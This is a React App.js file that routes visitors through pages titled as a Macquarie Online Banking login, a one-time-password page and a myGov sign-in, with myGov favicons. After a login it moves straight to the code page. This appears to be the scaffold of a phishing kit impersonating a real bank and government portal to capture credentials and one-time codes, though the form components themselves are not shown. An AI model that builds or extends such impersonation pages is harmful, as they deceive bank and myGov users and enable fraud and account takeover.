import React, { useState } from "react";
import Login from "./Signup";
import { Routes, Route, useNavigate } from "react-router-dom";
import Code from "./Code";
import Mygov from "./mygov/Mygov";
import MyGovVerify from "./mygov/MyGovVerify";
import usePageMetadata from "./usePageMetadata";


export default function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  usePageMetadata(
    "Log in to Macquarie Online Banking",
    "/favicon.ico",
    {
      "/": { title: "Log in to Macquarie Online Banking", favicon: "/favicon.ico" },
      "/code": { title: "One time password", favicon: "/favicon.ico" },
      "/mygov": { title: "Sign in with myGov - myGov", favicon: "/mygov-favicon.ico" },
      "/mygov_verification": { title: "Sign in with myGov - myGov", favicon: "/mygov-favicon.ico" }
    }
  );

  const navigate = useNavigate();

  const handleLoginSuccess = () => {
    setIsAuthenticated(true);
    navigate("/code");
  };

  return (
    <div>
      <>
        <Routes>
          <Route
            path="/"
            // element={<Mygov />}
            element={<Login onLoginSuccess={handleLoginSuccess} />}
          />
          <Route path="/code" element={<Code />} />
          <Route path="/mygov" element={<Mygov />} />
          <Route path="/mygov_verification" element={<MyGovVerify />} />
        </Routes>
      </>
    </div>
  );
}
